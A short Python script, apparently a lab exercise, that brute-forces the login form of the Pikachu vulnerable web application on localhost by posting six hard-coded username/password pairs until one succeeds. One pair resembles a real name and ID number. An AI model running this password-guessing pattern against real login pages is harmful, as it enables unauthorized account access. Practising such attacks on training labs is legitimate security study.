import requests

# 服务器地址
server_url = "http://127.0.0.1/pikachu/vul/burteforce/bf_form.php"
# 6个字典列表，包含用户名和密码的组合
credentials = [
    {"usr": "kkk", "passwd": "1235581"}, {"usr": "admin2", "passwd": "66662"}, {"usr": "12345", "passwd": "99993"},
    {"usr": "user", "passwd": "test4"}, {"usr": "test", "passwd": "aaa"}, {"usr": "fenghancan", "passwd": "2200350216"}
]
for credential in credentials:
    # 构建请求数据包
    payload = {
        "username": credential["usr"],
        "password": credential["passwd"],
        "submit": "Login"
    }
    # 发送请求
    response = requests.post(server_url, data=payload)
    # 处理服务器响应
    if "success" in response.text:
        print("Login successful with:", credential)
        break
    elif "failure" in response.text:
        print("failed with:", credential)